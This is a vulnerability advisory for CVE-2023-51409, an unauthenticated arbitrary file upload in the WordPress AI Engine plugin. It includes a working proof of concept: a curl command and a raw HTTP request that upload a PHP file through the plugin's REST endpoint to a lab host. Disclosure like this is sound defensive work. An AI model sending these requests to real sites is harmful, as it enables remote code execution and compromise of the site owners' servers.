# CVE-2023-51409
AI Engine: ChatGPT Chatbot &lt;= 1.9.98 - Unauthenticated Arbitrary File Upload via rest_upload


### Description:
The AI Engine: Chatbots, Generators, Assistants, GPT 4 and more! plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the 'rest_upload' function in all versions up to, and including, 1.9.98. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.

```
Severity: critical
CVE ID: CVE-2023-51409
CVSS Score: 9.8
CVSS Metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Plugin Slug: ai-engine
WPScan URL: https://www.wpscan.com/plugin/ai-engine
Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/a3fc4bac-9be0-4a1c-b4bb-4384d80e22f7?source=api-prod
```

POC
---
CURL
```
$ cat test.txt
robbie.txt
$ curl -X POST http://wordpress.lan/wp-json/mwai-ui/v1/files/upload -H "Content-Disposition: form-data; filename=\"test.txt\"" -F "file=@test.txt" | jq -r
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   336  100   139  100   197   1738   2463 --:--:-- --:--:-- --:--:--  4602
{
  "success": true,
  "data": {
    "id": "dc05affbc88c6d731a8fc6d122cd3839",
    "url": "http://wordpress.lan/wp-content/uploads/2024/02/test-1.txt"
  }
}

$ curl http://wordpress.lan/wp-content/uploads/2024/02/test-1.txt
robbie.txt
```

RAW HTTP
---
Request

```
POST /wp-json/mwai-ui/v1/files/upload HTTP/1.1
Host: wordpress.lan
User-Agent: curl/8.1.2
Accept: */*
Content-Disposition: form-data; filename="test.txt"
Content-Length: 206
Content-Type: multipart/form-data; boundary=------------------------8ecd2b831e8d20f4
Connection: close

--------------------------8ecd2b831e8d20f4
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: text/plain

<?php phpinfo(); ?>

--------------------------8ecd2b831e8d20f4--
```

Response
```
{
  "data": {
    "id": "1044f1ab4f6340fea9abecb331fe981c",
    "url": "http://wordpress.lan/wp-content/uploads/2024/02/test.php"
  },
  "success": true
}
```
